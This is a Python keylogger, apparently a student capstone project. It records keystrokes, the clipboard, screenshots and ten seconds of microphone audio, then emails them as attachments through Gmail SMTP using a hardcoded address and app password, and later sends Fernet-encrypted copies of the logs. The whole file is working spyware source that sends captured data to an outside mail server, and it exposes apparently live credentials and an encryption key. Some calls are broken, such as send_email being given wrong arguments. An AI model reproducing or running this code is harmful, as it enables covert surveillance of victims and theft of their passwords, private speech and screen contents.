
# Libraries

#for keystocks
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


from webbrowser import get
# Default Module used to collect the computer's Information

import socket
import platform

import win32clipboard

# Import Libraries for screenshots
from PIL import ImageGrab


import getpass
from requests import get

# Importing Libraries for Microphone
import sounddevice as sd
from scipy.io.wavfile import write

import time
import os

from cryptography.fernet import Fernet

import getpass


from multiprocessing import Process, freeze_support

# setup port and server name

smtp_port = 587
smtp_server = "smtp.gmail.com"


# Create Key Log TXT
keys_information = "key_log.txt"
system_information = "get_system_information.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
audio_information = "audio.wav"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

file_path = "D:\\sem 4\\capstone\\keylogger\\Project"
extend = "\\"
file_merge = file_path + extend


microphone_time = 10
time_iteration = 15
number_of_iterations_end = 1

email_from = "conestogakeylogger@gmail.com"
pswd = "efelgipnrwlzhhtn"

subject = "New Email from group 6"
email_list = ["conestogakeylogger@gmail.com", "conestogakeylogger@gmail.com", "conestogakeylogger@gmail.com"]


username = getpass.getuser()
toaddr = "conestogakeylogger@gmail.com"

key = "qK3UdD6vlLzwudRvAtntleR2a09VqWUOcOPoOkxjt9Q="
# Screenshot Start
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
screenshot()





# Create Microphone

def microphone(file_path, extend, audio_information, microphone_time):
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# To start recording, call the microphone function with the desired parameters
microphone(file_path, extend, audio_information, microphone_time)




# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data_bytes = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            win32clipboard.CloseClipboard()


            # Decode bytes to string
            pasted_data = pasted_data_bytes.decode('utf-8') if pasted_data_bytes else ""

            if pasted_data:
                f.write("Clipboard Data: \n" + pasted_data + '\n')
            else:
                f.write("Clipboard is empty\n")

        except Exception as e:
            f.write("Error copying clipboard data: {}\n".format(str(e)))

copy_clipboard()



def send_email(email_list):
    global body, person
    for person in email_list:
        body = "new email"

    # make a mime object to define part of the email

    msg = MIMEMultipart()
    msg["From"] = email_from
    msg["To"] = person
    msg["Subject"] = subject

    # attach the body of the msg
    msg.attach(MIMEText(body, 'plain'))

    filename = "key_log.txt"

    attachment = open(filename, 'rb')

    # attach the body of the msg
    msg.attach(MIMEText(body, 'plain'))

    # Attach key log file
    key_log_filename = "key_log.txt"
    key_log_attachment = open(file_path + extend + key_log_filename, 'rb')
    key_log_attachment_package = MIMEBase('application', 'octet-stream')
    key_log_attachment_package.set_payload(key_log_attachment.read())
    encoders.encode_base64(key_log_attachment_package)
    key_log_attachment_package.add_header('Content-Disposition', "attachment; filename= " + key_log_filename)
    msg.attach(key_log_attachment_package)
    key_log_attachment.close()

    # Attach clipboard file
    clipboard_filename = "clipboard.txt"
    clipboard_attachment = open(file_path + extend + clipboard_filename, 'rb')
    clipboard_attachment_package = MIMEBase('application', 'octet-stream')
    clipboard_attachment_package.set_payload(clipboard_attachment.read())
    encoders.encode_base64(clipboard_attachment_package)
    clipboard_attachment_package.add_header('Content-Disposition', "attachment; filename= " + clipboard_filename)
    msg.attach(clipboard_attachment_package)
    clipboard_attachment.close()

    # Attach system information file
    system_info_filename = "get_system_information.txt"
    system_info_attachment = open(file_path + extend + system_info_filename, 'rb')
    system_info_attachment_package = MIMEBase('application', 'octet-stream')
    system_info_attachment_package.set_payload(system_info_attachment.read())
    encoders.encode_base64(system_info_attachment_package)
    system_info_attachment_package.add_header('Content-Disposition', "attachment; filename= " + system_info_filename)
    msg.attach(system_info_attachment_package)
    system_info_attachment.close()

    # Attach audio file
    audio_filename = "audio.wav"
    audio_attachment = open(file_path + extend + audio_filename, 'rb')
    audio_attachment_package = MIMEBase('application', 'octet-stream')
    audio_attachment_package.set_payload(audio_attachment.read())
    encoders.encode_base64(audio_attachment_package)
    audio_attachment_package.add_header('Content-Disposition', "attachment; filename= " + audio_filename)
    msg.attach(audio_attachment_package)
    audio_attachment.close()

    # Attach screenshot file
    screenshot_filename = "screenshot.png"
    screenshot_attachment = open(file_path + extend + screenshot_filename, 'rb')
    screenshot_attachment_package = MIMEBase('application', 'octet-stream')
    screenshot_attachment_package.set_payload(screenshot_attachment.read())
    encoders.encode_base64(screenshot_attachment_package)
    screenshot_attachment_package.add_header('Content-Disposition', "attachment; filename= " + screenshot_filename)
    msg.attach(screenshot_attachment_package)
    screenshot_attachment.close()


    # Cast as string
    text = msg.as_string()

    # Connect with the server
    print("Connecting to server...")
    TIE_server = smtplib.SMTP(smtp_server, smtp_port)
    TIE_server.starttls()
    TIE_server.login(email_from, pswd)
    print("Successfully connected to server\n")

    # Send emails to "person" as the list is iterated
    print(f"Sending email to: {person}...")
    TIE_server.sendmail(email_from, person, text)
    print(f"Email sent to: {person}\n")

    # Close the port
    TIE_server.quit()
send_email(email_list)


# When we press Ke y

count = 0
keys = []

def on_press(key):
    global keys, count

#append key by adding count 1
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# Here We append the Key data in One File

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")

            if k == 'Key.space':
                f.write('\n')
            elif k == 'Key.enter':
                f.write('\n')
            elif k == 'Key.backspace':
                # Handle backspace as needed
                pass
            elif 'Key.shift' in k:
                # Handle shift key press
                pass
            else:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


#Time
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release = on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(email_list)
        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)



